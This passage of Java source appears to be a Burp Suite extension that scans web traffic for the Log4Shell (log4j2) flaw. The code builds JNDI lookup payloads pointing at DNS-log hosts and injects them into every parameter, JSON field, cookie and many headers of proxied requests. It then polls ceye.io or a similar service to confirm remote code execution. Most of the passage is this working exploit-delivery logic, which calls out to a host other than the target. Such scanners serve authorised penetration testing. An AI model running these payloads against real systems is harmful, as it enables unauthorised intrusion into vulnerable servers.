            vulnurl_total = vulnurl_total + vulnurls[0] + "://" + i + "." + vulnurls[1];
        }else
            vulnurl_total = vulnurl;
        return vulnurl_total;
    }

    public String FileGetValue(File f, String key){ // 读取properties文件，根据key取出value
        BufferedReader reader = null;
        String value = "";
        StringBuffer sbf = new StringBuffer();
        String output = "";
        try {
            reader = new BufferedReader(new FileReader(f));
            String tempStr;
            while ((tempStr = reader.readLine()) != null) {
                sbf.append(tempStr + '\n');
            }
            reader.close();
            output =  sbf.toString();
        } catch (IOException e) {}
        String[] properties_lists = output.split("\n");
        for (String str:properties_lists) {
            String[] str_lists = str.split("=",2);
            if (str_lists[0].equals(key))
                value = str_lists[1];
        }
        return value.trim();
    }

    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {

        String[] white_lists = BurpExtender.this.whitelists_area.getText().split("\n");
        File f;
        int param_i = 0;
        String privatednsResponseurl = "";
        String os = System.getProperty("os.name");
        if (os.toLowerCase().startsWith("win")) {
            f = new File("log4j2burpscanner.properties");
        }else{
            String jarPath = callbacks.getExtensionFilename(); // 获取当前jar的路径
            f = new File(jarPath.substring(0, jarPath.lastIndexOf("/")) + "/" + "log4j2burpscanner.properties");
        }
        BufferedReader reader = null;
        StringBuffer sbf = new StringBuffer() ;
        String output = "";
        try {
            reader = new BufferedReader(new FileReader(f));
            String tempStr;
            while ((tempStr = reader.readLine()) != null) {
                sbf.append(tempStr + '\n');
            }
            reader.close();
            output =  sbf.toString();
            if (output.contains("isuseceye=1")){
                this.logxn = false;
                this.ceyeio = true;
                this.logxn_dnslog = FileGetValue(f,"ceyednslog");
                this.ceyetoken = FileGetValue(f,"ceyetoken");
            }else{
                this.ceyeio = false;
            }
            if (output.contains("isuseprivatedns=1")){
                this.logxn = false;
                this.ceyeio = false;
                this.privatedns = true;
                this.logxn_dnslog = FileGetValue(f,"privatednslogurl");
                privatednsResponseurl = FileGetValue(f,"privatednsResponseurl");
            }else{
                this.privatedns = false;
            }

            if (output.contains("isuseUserAgentTokenXff=0")){
                this.isuseUserAgentTokenXff = false;
            }else{
                this.isuseUserAgentTokenXff = true;
            }

            if (output.contains("isuseXfflists=1")){
                this.isuseXfflists = true;
            }else{
                this.isuseXfflists = false;
            }

            if (output.contains("isuseAllCookie=0")){
                this.isuseAllCookie = false;
            }else{
                this.isuseAllCookie = true;
            }

            if(output.contains("isuseContenttypeRefererOrigin=1")){
                this.isuseContenttypeRefererOrigin = true;
            }else{
                this.isuseContenttypeRefererOrigin = false;
            }

            if(output.contains("isuseAccept=1")){
                this.isuseAccept = true;
            }else{
                this.isuseAccept = false;
            }

            if(output.contains("isip=1") && output.contains("isuseprivatedns=1")){
                this.isip = true;
                this.isipincreasing = false;
            }else{
                this.isip = false;
                this.isipincreasing = true;
            }
            this.dnsldaprmi = FileGetValue(f, "dnsldaprmi").trim();
            this.jndiparam = FileGetValue(f,"jndiparam").trim();

        } catch (IOException e) {}

        IHttpService httpService = baseRequestResponse.getHttpService();
        String host = httpService.getHost();

        if (host.equals("log.xn--9tr.com")) // 白名单设置
            return null;

        if ( !BurpExtender.this.whitelists_area.getText().trim().equals("")) { // 判断白名单不为空
            for (String white_host_single : white_lists) // 白名单设置
            {
//                stdout.println(white_host_single);
                white_host_single = white_host_single.replace("*.", "");
                String[] hostlists = host.split(":");
                if (hostlists[0].endsWith(white_host_single)) {
                    return null;
                }
            }
        }

        byte[] request = baseRequestResponse.getRequest();
        URL url = this.helpers.analyzeRequest(baseRequestResponse).getUrl();
        IRequestInfo analyzedIRequestInfo = this.helpers.analyzeRequest(request);

        List<String> request_header = analyzedIRequestInfo.getHeaders(); // 获取请求头
        // 循环获取参数，判断类型，进行加密处理后，再构造新的参数，合并到新的请求包中。

        List<List> request_headers = new ArrayList<List>(); // 请求集

        List<String> code_headers = new ArrayList<String>() ;// 原请求

//        stdout.println(code_headers);

        String firstrequest_header = request_header.get(0); //第一行请求包含请求方法、请求uri、http版本
        String[] firstheaders = firstrequest_header.split(" ");

        String uri = firstheaders[1].split("\\?",2)[0].replace("/",".");

        if (firstheaders[1].split("\\?")[0].replace("/",".").length() > 25) {
            uri = firstheaders[1].split("\\?")[0].replace("/",".").substring(0, 25);
        }

        String total_uri = "";
        String[] uris = uri.split("\\.");
        for(String uri_single:uris) {
            if (!uri_single.equals(""))
                total_uri = total_uri + "." + uri_single.substring(0,1);
        }
        uri = total_uri;

        if (uri.endsWith("."))
            uri = uri.substring(0,uri.length()-1);

        if (this.jndiparam.equals("jndi"))
            this.jndiparam = this.jndiparam + ":";

        String vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "://" + firstheaders[0].trim() + "." + host  + uri + "."+ this.logxn_dnslog.trim() + "/%20test}";

        if (this.isip && this.privatedns){
            vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "://" + this.logxn_dnslog.trim() + "/%20test}";
        }

        String uri_total = "";

        // uri黑名单，如果匹配到不进行扫描
        List<String> blacklists = Arrays.asList(".js",".jpg",".png",".jpeg",".svg",".mp4",".css",".mp3",".ico",".woff");

        for (String black_single: blacklists)
            if (firstheaders[1].endsWith(black_single))
                return null;

        //firstheaders[0] 为请求方法
        //firstheaders[1] 为请求的uri
        //firstheaders[2] 为请求协议版本，不用看

        /*****************获取body 方法一**********************/
        int bodyOffset = analyzedIRequestInfo.getBodyOffset();
        byte[] byte_Request = baseRequestResponse.getRequest();

        String request2 = new String(byte_Request); //byte[] to String
        String body = request2.substring(bodyOffset); // 请求体
        if(!firstheaders[1].contains("?")) {  // 无参情况，直接在路径后面添加payload
            firstheaders[1] = firstheaders[1] + vulnurl_param(vulnurl, param_i++, this.isipincreasing);
        }

        // 这里一直到POST的行，因为GET、POST、PUT等其他请求都可能请求的uri有参数
        String[] requries = new String[0];
        if (firstheaders[1].contains("?")) {
            String[] requris = firstheaders[1].split("\\?",2);

            if (requris.length > 1) {
                requries = requris[1].split("&");
                for (String uri_single : requries) {
                    String[] uri_single_lists = uri_single.split("=");
                    uri_total = uri_total + uri_single_lists[0] + "=" + vulnurl_param(vulnurl, param_i++,this.isipincreasing) + "&";
                }
                uri_total = uri_total.substring(0, uri_total.length() - 1);
            }
            firstheaders[1] = requris[0] + "?" + uri_total;
        }
        firstheaders[1] = firstheaders[1].replace("{","%7b").replace("}","%7d"); // 替换GET参数里的{和}
        if(firstheaders[0].contains("POST") || firstheaders[0].contains("PUT")){

            /**  .contains("=")    !.contains("{")
             * a=1&b=2&c=3
             */
            if (body.contains("=") && !body.contains("{")) {
                String body_total = "";
                String[] bodys_single = body.split("&");
                for(String body_single:bodys_single) {
                    String[] body_single_lists = body_single.split("=");
                    body_total = body_total + body_single_lists[0] + "="  + vulnurl_param(vulnurl, param_i++,this.isipincreasing) +  "&" ;
                }
                body_total = body_total.substring(0,body_total.length()-1);
                body =  body_total;
            }

            /** !.contains("=")    .contains("{")
             * {"a":"1","b":"22222"}
             */
            else if( !body.contains("={") && body.contains("{") && !body.contains("&") && body.contains("\":\"") && !body.contains(":{\"")){
                JSONObject jsonObject = JSON.parseObject(body);
                for (String key:jsonObject.keySet()) {
                    jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
                }
                body = jsonObject.toString();
            }

            /** .contains("=")    .contains("{")
             * a=1&param={"a":"1","b":"22222"}
             */
            else if( body.contains("={") && body.contains("&")){
                String body_total = "";
                String[] bodys_single = body.split("&");
                for(String body_single:bodys_single) {
                    if (body_single.contains("{")){
                        String[] body_single_lists = body_single.split("=");
                        JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
                        for (String key:jsonObject.keySet()) {
                            jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
                        }
                        body_total = body_total + body_single_lists[0] + "=" + jsonObject.toString() + "&";
                    }else {
                        String[] body_single_lists = body_single.split("=");
                        body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl, param_i++,this.isipincreasing) + "&";
                    }
                }
                body_total = body_total.substring(0,body_total.length()-1);
                body =  body_total;
            }

            /**
             * body={"a":"1","b":"22222"}
             */
            else if(body.contains("={") && !body.contains("&") && !body.contains("\":{")){
                String body_total = "";
                if (body.contains("{")){
                    String[] body_single_lists = body.split(body.split("=")[0] + "=");
                    JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
                    for (String key:jsonObject.keySet()) {
                        jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
                    }
                    body_total = body_total + body.split("=")[0] + "=" + jsonObject.toString();
                }else {
                    String[] body_single_lists = body.split("=");
                    body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl, param_i++,this.isipincreasing) ;
                }
                body = body_total;
            }

            /**
             * body={"params":{"a":"1","b":"22222"}}
             */
            else if (body.contains("={\"") && !body.contains("&") && body.contains("\":{")){
                String body_code = body;
                body = body.split(body.split("=")[0] + "=")[1];

                JSONObject jsonObject = JSON.parseObject(body);
                for (String key:jsonObject.keySet()) {
                    if (jsonObject.getString(key).contains("{")){
                        JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
                        for (String key2:jsonObject2.keySet())
                            jsonObject2.put(key2,vulnurl_param(vulnurl, param_i++,this.isipincreasing));
                        jsonObject.put(key,jsonObject2);
                    } else
                        jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
                }
                body = body_code.split("=")[0] + "=" + jsonObject.toString();
            }
            /** !.contains("&")    .contains("\":{")  !.contains("={")
             * {"params":{"a":"1","b":"22222"}}
             */
            else if( body.contains("\":{") && !body.contains("={\"")) {
                JSONObject jsonObject = JSON.parseObject(body);
                for (String key:jsonObject.keySet()) {
                    if (jsonObject.getString(key).contains("{")){
                        JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
                        for (String key2:jsonObject2.keySet())
                            jsonObject2.put(key2,vulnurl_param(vulnurl, param_i++,this.isipincreasing));
                        jsonObject.put(key,jsonObject2);
                    } else
                        jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
                }
                body = jsonObject.toString();
            }


            body = body.replace("$","%24"); // 对请求体的{、}、$、/进行编码

        }

        request_header.set(0,firstheaders[0] + " " + firstheaders[1] + " " + firstheaders[2]);
//            stdout.println("1130");
//            stdout.println(request_header.get(0));
        // 去除源请求包里的Origin参数
        /*****************增加header**********************/
        List<String> xff_lists = Arrays.asList("X-Forwarded","X-Requested-With","X-Requested-With", "X-Forwarded-Host",
                "X-remote-IP","X-remote-addr","True-Client-IP","Client-IP","X-Real-IP",
                "Ali-CDN-Real-IP","Cdn-Src-Ip","Cdn-Real-Ip","CF-Connecting-IP","X-Cluster-Client-IP",
                "WL-Proxy-Client-IP", "Proxy-Client-IP","Fastly-Client-Ip","True-Client-Ip","X-Originating-IP",
                "X-Host","X-Custom-IP-Authorization","X-original-host","X-forwarded-for");

//            stdout.println("1149");
//            stdout.println(request_header.get(0));
        StringBuilder cookie_total = new StringBuilder();
        String lowup = "up"; // 默认Cookie为大写

        for (int i = 0; i < request_header.size(); i++) {

            if (request_header.get(i).contains("User-Agent:") || request_header.get(i).contains("token:") || request_header.get(i).contains("Token:") || request_header.get(i).contains("Bearer Token:"))
                if (this.isuseUserAgentTokenXff) // 是否测试UA头、token、X-Forward-for头以及X-Client-IP头
                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)

            if (request_header.get(i).contains("X-Forwarded-For:") && this.isuseUserAgentTokenXff){
                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
            }

            if (request_header.get(i).contains("X-Client-IP:") && this.isuseUserAgentTokenXff){
                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
            }

            // Content-Type、Referer、Accept-Language、Accept、Accept-Encoding、Origin等都有可能成为触发点
            if (request_header.get(i).contains("Content-Type:") && this.isuseContenttypeRefererOrigin)
//                    stdout.println(isuseContenttypeRefererOrigin);
                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl.replace("%24","$"), param_i++,this.isipincreasing));

            if ((request_header.get(i).contains("Referer:") || request_header.get(i).contains("referer:") ) && this.isuseContenttypeRefererOrigin)
                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing));

            if (request_header.get(i).contains("Accept-Language:") && this.isuseAccept)
                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing));

            if (request_header.get(i).contains("Accept:") && this.isuseAccept)
                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing));

            if (request_header.get(i).contains("Accept-Encoding:") && this.isuseAccept)
                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing));

            if (request_header.get(i).contains("Origin:") && this.isuseContenttypeRefererOrigin)
                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing));


//                stdout.println("1197");
//                stdout.println(request_header.get(0));

            for (String xff:xff_lists)
                if (request_header.get(i).contains(xff + ":"))
                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing));

            if (request_header.get(i).contains("cookie:") || request_header.get(i).contains("Cookie:") ) {
                if (request_header.get(i).contains("cookie:")) {
                    lowup = "low";
                }else if (request_header.get(i).contains("Cookie:") ){
                    lowup = "up";
                }
                if (this.isuseAllCookie) { // 对所有cookie发起请求
//                        stdout.println("isuseallCookie为" + this.isuseAllCookie);
                    String cookies = request_header.get(i).replace("cookie:", "").replace("Cookie:", "");//去掉cookie: 、Cookie:
                    String[] cookies_lists = cookies.split(";"); // 根据; 分割cookie
                    for (String cookie_single : cookies_lists) {  // 把分割出来的单个cookie的值进行vulnurl添加
                        String[] cookie_single_lists = cookie_single.split("=");
                        cookie_total.append(cookie_single_lists[0]).append("=").append(vulnurl_param(vulnurl, param_i++,this.isipincreasing)).append("; ");
                    }
                    if (lowup.contains("up"))
                        request_header.set(i, "Cookie:" + cookie_total); // Cookie头增加
                    else
                        request_header.set(i, "cookie:" + cookie_total); // cookie头增加
                }else{ // 只对单条cookie发起请求
//                        stdout.println("1219");
//                        stdout.println(this.isuseAccept);
                    String cookies = request_header.get(i).replace("cookie:", "").replace("Cookie:", "");//去掉cookie: 、Cookie:
                    String[] cookies_lists = cookies.split(";"); // 根据; 分割cookie
                    String[] cookie_single_0 = cookies_lists[0].split("=");
                    cookies_lists[0] = cookie_single_0[0] + "=" + cookie_single_0[1] + vulnurl_param(vulnurl, param_i++,this.isipincreasing);
                    for (String cookie_single : cookies_lists) {  // 把分割出来的单个cookie的值进行vulnurl添加
                        cookie_total.append(cookie_single).append("; ");
                    }
                    if (lowup.contains("up"))
                        request_header.set(i, "Cookie:" + cookie_total); // Cookie头增加
                    else
                        request_header.set(i, "cookie:" + cookie_total); // cookie头增加
                }
            }
        }
//            for (String xff:xff_lists)
//                if (!request_header.contains(xff + ":") && this.isuseXfflists )  // 是否用xff列表测试，包含其他标识IP头
//                    request_header.add(xff + ": 127.0.0.1 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));

//            stdout.println("1238");
//            stdout.println(request_header.get(0));

        // 参数头由于参数问题，XFF头 如果没有参数，还会自动加上
        if (!request_header.contains("X-Forwarded-For:") && this.isuseUserAgentTokenXff) // 如果没有xff头，就增加
            request_header.add( "X-Forwarded-For: 127.0.0.1 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));

        if (!request_header.contains("X-Client-IP:") && this.isuseUserAgentTokenXff) // 如果没有x-client-ip头，就增加
            request_header.add( "X-Client-IP: 127.0.0.1 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));

        if (!request_header.contains("If-Modified-Since:") && this.isuseUserAgentTokenXff) // 如果没有If-Modified-Since头，就增加(bp貌似会自动去除，与Last-Modified成对出现)
        {
//                stdout.println("no If-Modified-Since: 1 ");
            request_header.add("If-Modified-Since: 1 " + vulnurl_param(vulnurl, param_i++, this.isipincreasing));
//                stdout.println(request_header);
        }

        // 如果没有参数，那么将不会测试
//            if (!request_header.contains("Content-Type:") && this.isuseContenttypeRefererOrigin)
//                request_header.add( "Content-Type: text/plain;charset=UTF-8 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
//
//            if ((!request_header.contains("Referer:") || !request_header.contains("referer:") ) && this.isuseContenttypeRefererOrigin)
//                request_header.add( "Referer: https://www.google.com " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
//
//            if (!request_header.contains("Accept-Language:") && this.isuseAccept)
//                request_header.add( "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
//
//            if (!request_header.contains("Accept:") && this.isuseAccept)
//                request_header.add( "Accept: */* " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
//
//            if (!request_header.contains("Accept-Encoding:") && this.isuseAccept)
//                request_header.add( "Accept-Encoding: gzip, deflate " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
//
//            if (!request_header.contains("Origin:") && this.isuseContenttypeRefererOrigin)
//                request_header.add( "Origin: https://www.google.com " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));

        request_headers.add(request_header); // 将uri被payload化的请求加入待请求集
        for (int jj = 0; jj < request_header.size() ; jj++){
            request_header.set(jj, request_header.get(jj).replace("$","%24"));
        }



        for (int j = 0; j < request_header.size() ; j++){

            if (j != 0) {
                // 对payload进行优化，在测试某些系统中发现，$符号会造成请求不解析，具体可以在内网某远A8系统找到该类情况，但是由于在
                // 内网VMWARE测试发现，如果Content-type中的$进行url编码，会触发不了漏洞，故增加改动如下，正常uri请求中header携带
                // 的请求头中的$进行编码处理，payload的uri请求头中header携带的请求头中的$不进行编码处理
                code_headers.add(request_header.get(j));
            }
            else if(j == 0) {
                code_headers.add(firstrequest_header);
            }
        }

        if (!code_headers.get(0).equals(request_header.get(0))) // 如果uri payload化
            request_headers.add(code_headers); // 将原请求添加到请求集

        for(List request_header_single:request_headers) { // 遍历请求集
//                stdout.println(request_header_single);


            byte[] request_bodys = body.getBytes();  //String to byte[]
            String reqMethod = this.helpers.analyzeRequest(baseRequestResponse).getMethod();
            byte[] newRequest = this.helpers.buildHttpMessage(request_header_single, request_bodys);

            IHttpRequestResponse newIHttpRequestResponse = this.callbacks.makeHttpRequest(httpService, newRequest);
            byte[] response = newIHttpRequestResponse.getResponse();

            if (this.logxn) { // logxn 的dnslog记录
                String words_vuln = firstheaders[0].trim() + "." + host.trim() + uri.trim();
                if (words_vuln.length() > 20)
                    words_vuln = words_vuln.substring(words_vuln.length() - 20);
                OkHttpClient client = new OkHttpClient();
                String indexUrl = "https://log.xn--9tr.com/" + this.logxn_dnslog_token.trim();
//                stdout.println(indexUrl);
                Request loginReq = new Request.Builder()
                        .url(indexUrl)
                        .get()
                        .build();
                try {
                    Robot r = new Robot();
                    r.delay(3000);
                } catch (AWTException e) {
                    e.printStackTrace();
                }
                Call call = client.newCall(loginReq);

                Response response2 = null;
                try {
                    response2 = call.execute();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                try {
                    assert response2 != null;
                    String respCookie = Objects.requireNonNull(response2.body()).string(); // dnslog的响应体

                    if (respCookie.contains(words_vuln)) {
                        synchronized (this.Udatas) {
//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
                            int row = this.Udatas.size();
                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce", newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
                            fireTableRowsInserted(row, row);
                            List<IScanIssue> issues = new ArrayList(1);
                            issues.add(new CustomScanIssue(
                                    httpService,
                                    url,
                                    new IHttpRequestResponse[]{newIHttpRequestResponse},
                                    "log4j2 RCE",
                                    "log4j2 RCE",
                                    "High"
                            ));
                            return issues;
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            if (this.ceyeio) { // ceye 的dnslog记录
                String words_vuln = firstheaders[0].trim() + "." + host.trim() + uri.trim();
                if (words_vuln.length() > 20)
                    words_vuln = words_vuln.substring(words_vuln.length() - 20);
//                stdout.println(firstheaders[0].trim() + "." + host + uri);
                OkHttpClient client = new OkHttpClient();
                String indexUrl = "http://api.ceye.io/v1/records?token=" + this.ceyetoken.trim() + "&type=dns&filter=" + words_vuln;
                Request loginReq = new Request.Builder()
                        .url(indexUrl)
                        .get()
                        .build();
                try {
                    Robot r = new Robot();
                    r.delay(2500);
                } catch (AWTException e) {
                    e.printStackTrace();
                }
                Call call = client.newCall(loginReq);

                Response response2 = null;
                try {
                    response2 = call.execute();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                try {
                    assert response2 != null;
                    String respCookie = Objects.requireNonNull(response2.body()).string(); // dnslog的响应体
//                    stdout.println(respCookie);

                    if (respCookie.contains(words_vuln)) {
                        synchronized (this.Udatas) {
//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
                            int row = this.Udatas.size();
                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce", newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
                            fireTableRowsInserted(row, row);
                            List<IScanIssue> issues = new ArrayList(1);
                            issues.add(new CustomScanIssue(
                                    httpService,
                                    url,
                                    new IHttpRequestResponse[]{newIHttpRequestResponse},
                                    "log4j2 RCE",
                                    "log4j2 RCE",
                                    "High"
                            ));
                            return issues;
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            if (this.privatedns && !this.isip) { // privatedns 的dnslog记录
                String words_vuln = firstheaders[0].trim() + "." + host.trim() + uri.trim();
                if (words_vuln.length() > 20)
                    words_vuln = words_vuln.substring(words_vuln.length() - 20);
                OkHttpClient client = new OkHttpClient();
                String indexUrl = privatednsResponseurl.trim();
                Request loginReq = new Request.Builder()
                        .url(indexUrl)
                        .get()
                        .build();

                Call call = client.newCall(loginReq);
                try {
                    Robot r = new Robot();
                    r.delay(2500);
                } catch (AWTException e) {
                    e.printStackTrace();
                }
                Response response2 = null;
                try {
                    response2 = call.execute();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                try {
                    assert response2 != null;
                    String respCookie = Objects.requireNonNull(response2.body()).string(); // dnslog的响应体

                    if (respCookie.contains(words_vuln)) {
                        synchronized (this.Udatas) {
                            int row = this.Udatas.size();
                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce", newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
                            fireTableRowsInserted(row, row);
                            List<IScanIssue> issues = new ArrayList(1);
                            issues.add(new CustomScanIssue(
                                    httpService,
                                    url,
                                    new IHttpRequestResponse[]{newIHttpRequestResponse},
                                    "log4j2 RCE",
                                    "log4j2 RCE",
                                    "High"
                            ));
                            return issues;
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return null;








    }
    //Unicode转中文
    public static String UnicodeDecode(String ascii) {
        List<String> ascii_s = new ArrayList<String>();
        String zhengz = "\\\\u[0-9,a-f,A-F]{4}";
        Pattern p = Pattern.compile(zhengz);
        Matcher m = p.matcher(ascii);
        while (m.find()) {
            ascii_s.add(m.group());
        }
        for (int i = 0, j = 2; i < ascii_s.size(); i++) {
            String code = ascii_s.get(i).substring(j, j + 4);
            char ch = (char) Integer.parseInt(code, 16);
            ascii = ascii.replace(ascii_s.get(i), String.valueOf(ch));
        }
        return ascii;
    }

    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        if (existingIssue.getIssueName().equals(newIssue.getIssueName()))
            return -1;
        return 0;
    }

    boolean checUrl(String host, int port) {
        for (TablesData d : this.Udatas) {
            if (d.host.equals(host) && d.port == port)
                return false;
        }
        return true;
    }

    public IHttpService getHttpService() {
        return this.currentlyDisplayedItem.getHttpService();
    }

    public byte[] getRequest() {
        return this.currentlyDisplayedItem.getRequest();
    }

    public byte[] getResponse() {
        return this.currentlyDisplayedItem.getResponse();
    }

    public String getTabCaption() {
        return "log4j2 RCE";
    }

    public Component getUiComponent() {
        return this.mjSplitPane;
    }

    public int getRowCount() {
        return this.Udatas.size();
    }

    public int getColumnCount() {
        return 5;
    }

    /**
     * 获取响应中RememberMe的数量
     * @param response
     * @return
     */
    public int getRememberMeNumber(byte[] response){
        int number = 0;
        for (ICookie cookies : helpers.analyzeResponse(response).getCookies()){
            if (cookies.getName().equals("rememberMe")){
                number++;
            }
        }
        return number;
    }

    public String getColumnName(int columnIndex) {
        switch (columnIndex) {
            case 0:
                return "#";
            case 1:
                return "Method";
            case 2:
                return "URL";
            case 3:
                return "Status";
            case 4:
                return "Issue";
        }
        return null;
    }

    public Object getValueAt(int rowIndex, int columnIndex) {
        TablesData datas = this.Udatas.get(rowIndex);
        switch (columnIndex) {
            case 0:
                return Integer.valueOf(datas.Id);
            case 1:
                return datas.Method;
            case 2:
                return datas.URL;
            case 3:
                return datas.Status;
            case 4:
                return datas.issue;
        }
        return null;
    }

    public class URLTable extends JTable {
        public URLTable(TableModel tableModel) {
            super(tableModel);
        }

        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            BurpExtender.TablesData dataEntry = BurpExtender.this.Udatas.get(convertRowIndexToModel(row));
            BurpExtender.this.HRequestTextEditor.setMessage(dataEntry.requestResponse.getRequest(), true);
            BurpExtender.this.HResponseTextEditor.setMessage(dataEntry.requestResponse.getResponse(), false);
            BurpExtender.this.currentlyDisplayedItem = dataEntry.requestResponse;
            super.changeSelection(row, col, toggle, extend);
        }
    }

    public static class TablesData {
        final int Id;

        final String Method;

        final String URL;

        final String Status;

        final String issue;

        final IHttpRequestResponse requestResponse;

        final String host;

        final int port;

        public TablesData(int id, String method, String url, String status, String issue, IHttpRequestResponse requestResponse, String host, int port) {
            this.Id = id;
            this.Method = method;
            this.URL = url;
            this.Status = status;
            this.issue = issue;
            this.requestResponse = requestResponse;
            this.host = host;
            this.port = port;
        }
    }

}





class CustomScanIssue implements IScanIssue
{
    private IHttpService httpService;
    private URL url;
    private IHttpRequestResponse[] httpMessages;
    private String name;
    private String detail;
    private String severity;

    /**
     *
     * @param httpService   HTTP服务
     * @param url   漏洞url
     * @param httpMessages  HTTP消息
     * @param name  漏洞名称
     * @param detail    漏洞细节
     * @param severity  漏洞等级
     */
    public CustomScanIssue(
            IHttpService httpService,
            URL url,
            IHttpRequestResponse[] httpMessages,
            String name,
            String detail,
            String severity)
    {
        this.httpService = httpService;
        this.url = url;
        this.httpMessages = httpMessages;
        this.name = name;
        this.detail = detail;
        this.severity = severity;
    }

    public URL getUrl()
    {
        return url;
    }

    public String getIssueName()
    {
        return name;
    }

    public int getIssueType()
    {
        return 0;
    }

    public String getSeverity()
    {
        return severity;
    }

    public String getConfidence()
    {
        return "Certain";
    }

    public String getIssueBackground()
    {
        return null;
    }

    public String getRemediationBackground()
    {
        return null;
    }


    public String getIssueDetail()
    {
        return detail;
    }

    public String getRemediationDetail()
    {
        return null;
    }

    public IHttpRequestResponse[] getHttpMessages()
    {
        return httpMessages;
    }

    public IHttpService getHttpService()
    {
        return httpService;
    }

}
